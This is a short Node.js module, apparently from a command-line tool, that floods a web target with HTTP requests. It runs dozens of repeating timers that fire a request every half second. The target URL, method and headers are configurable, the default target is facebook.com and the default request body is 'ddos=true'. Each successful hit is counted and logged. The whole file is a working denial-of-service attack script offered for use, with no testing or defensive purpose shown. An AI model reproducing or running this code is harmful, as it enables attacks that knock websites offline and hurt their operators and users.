const prompts = require('prompts');
const colors = require("colors");
const axios = require("axios").default;

const db = require("../database");

module.exports = {
    return: false,
    run: async () => {
        const url = await db.get("url") ?? "https://facebook.com";
        const method = await db.get("method") ?? "get";
        const headers = await db.get("headers") ?? { "Content-Type": "application/x-www-form-urlencoded" }
        const body = await db.get("body") ?? "ddos=true"
        const rpc = await db.get("rpc") ?? 85;
        const ct = await db.get("ct") ?? 0.5


        var requests = 0;

        for (let i = 0; i <= rpc; i++) {
            setInterval(async () => {
                const data = {
                    url: url,
                    method: method,
                    headers: headers
                }
                if (method == "post") {
                    data['body'] = body
                }

                await axios(data)
                    .then(async () => {
                        requests++;
                        console.log(`[SUCCESS] ${requests} : ${url}`.green);
                    })
                    .catch((e) => {
                        console.log(`[RETRYING] ${e} : ${url}`.yellow);
                    })
            }, ct * 1000)
        }
    }
}

const ss = [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded", "description": "", "type": "text", "enabled": true }]